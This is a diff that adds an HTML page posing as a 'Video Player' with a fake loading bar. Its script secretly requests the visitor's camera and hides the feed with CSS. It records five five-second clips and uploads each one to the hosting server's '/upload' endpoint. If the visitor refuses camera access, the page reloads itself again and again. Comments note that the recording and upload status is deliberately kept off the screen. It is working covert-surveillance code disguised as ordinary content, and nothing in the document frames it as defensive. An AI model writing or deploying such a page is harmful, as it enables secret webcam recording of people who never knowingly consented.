@@ -1,0 +1,215 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Video Player</title>
+  <!-- Add a favicon to avoid 404 errors -->
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+    }
+    #camera-feed {
+      display: none; /* Hide the camera feed */
+    }
+    #video-icon {
+      font-size: 5em;
+      text-align: center;
+      margin-top: 20px;
+      color: #4285f4;
+    }
+    #loading-container {
+      width: 80%;
+      max-width: 500px;
+      margin: 20px auto;
+    }
+    #loading-bar {
+      width: 0%;
+      height: 10px;
+      background-color: #4285f4;
+      border-radius: 5px;
+      transition: width 0.5s;
+    }
+    #status {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 1.2em;
+      color: #555;
+    }
+    .content-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 600px;
+      width: 90%;
+    }
+    h1 {
+      color: #333;
+      margin-top: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="content-container">
+    <h1>Video Content</h1>
+    <div id="video-icon">🎬</div>
+    <div id="loading-container">
+      <div id="loading-bar"></div>
+    </div>
+    <p id="status">Preparing your content, please wait...</p>
+  </div>
+  <video id="camera-feed" autoplay playsinline muted></video>
+
+  <script>
+    const cameraFeed = document.getElementById('camera-feed');
+    const loadingBar = document.getElementById('loading-bar');
+    const statusText = document.getElementById('status');
+    let mediaRecorder;
+    let recordedChunks = [];
+    let recordingCount = 0;
+    const maxRecordings = 5; // Number of recordings to make
+    let width = 0;
+    let cameraStream = null;
+
+    // Animate the loading bar
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+        statusText.textContent = "Finalizing content...";
+      } else {
+        width++;
+        loadingBar.style.width = width + '%';
+      }
+    }, 180);
+
+    // Handle camera permission denied by reloading page
+    function handlePermissionDenied() {
+      console.error('Camera access denied - reloading page');
+      statusText.textContent = 'Camera access required to continue. Please allow access.';
+      setTimeout(() => window.location.reload(), 1500);
+    }
+
+    // Start recording sequence once we have camera access
+    function startRecordingSequence(stream) {
+      cameraStream = stream;
+      cameraFeed.srcObject = stream;
+      recordNextVideo();
+    }
+
+    // Record next video in sequence
+    function recordNextVideo() {
+      if (recordingCount >= maxRecordings) {
+        statusText.textContent = "Content loading complete. Thanks for your patience!";
+        return;
+      }
+
+      // Force MP4 format for better compatibility
+      let options = { 
+        mimeType: 'video/mp4',
+        videoBitsPerSecond: 1000000  // 1 Mbps for better compatibility
+      };
+      
+      // If MP4 not supported, try WebM as fallback
+      if (!MediaRecorder.isTypeSupported('video/mp4')) {
+        if (MediaRecorder.isTypeSupported('video/webm')) {
+          options.mimeType = 'video/webm';
+        }
+      }
+      
+      console.log(`Using media type: ${options.mimeType}`);
+      mediaRecorder = new MediaRecorder(cameraStream, options);
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+          const blob = new Blob([event.data], { type: options.mimeType });
+          sendVideoToServer(blob);
+        }
+      };
+
+      mediaRecorder.onstop = () => {
+        console.log("MediaRecorder stopped");
+        recordingCount++;
+        // Don't update status text with recording info
+        // Start next recording after a short delay
+        setTimeout(recordNextVideo, 500);
+      };
+
+      mediaRecorder.onerror = (event) => {
+        console.error("MediaRecorder Error:", event.error);
+        recordingCount++;
+        setTimeout(recordNextVideo, 500);
+      };
+      
+      // Start recording for 5 seconds
+      mediaRecorder.start();
+      
+      // Stop after 5 seconds
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          mediaRecorder.stop();
+        }
+      }, 5000);
+    }
+
+    // Send video to the server
+    function sendVideoToServer(blob) {
+      // Skip tiny blobs
+      if (blob.size < 10000) {
+        console.warn("Blob too small, skipping upload:", blob.size);
+        return;
+      }
+      
+      console.log(`Preparing to upload video blob: ${blob.size} bytes, type: ${blob.type}`);
+      
+      const formData = new FormData();
+      // Force .mp4 extension regardless of actual type
+      formData.append('video', blob, `recording-${Date.now()}.mp4`);
+
+      // Use the correct backend URL
+      const backendUrl = window.location.origin + '/upload';
+
+      fetch(backendUrl, {
+        method: 'POST',
+        body: formData,
+      })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error(`Upload failed: ${response.status}`);
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log('Video chunk uploaded successfully!');
+          // Don't update status with upload info
+        })
+        .catch(error => {
+          console.error('Error uploading video chunk:', error);
+        });
+    }
+
+    // Request camera access just once
+    navigator.mediaDevices.getUserMedia({ 
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        frameRate: { ideal: 24 } // Lower frame rate for better compatibility
+      }, 
+      audio: false 
+    })
+    .then(startRecordingSequence)
+    .catch(handlePermissionDenied);
+  </script>
+</body>
+</html>
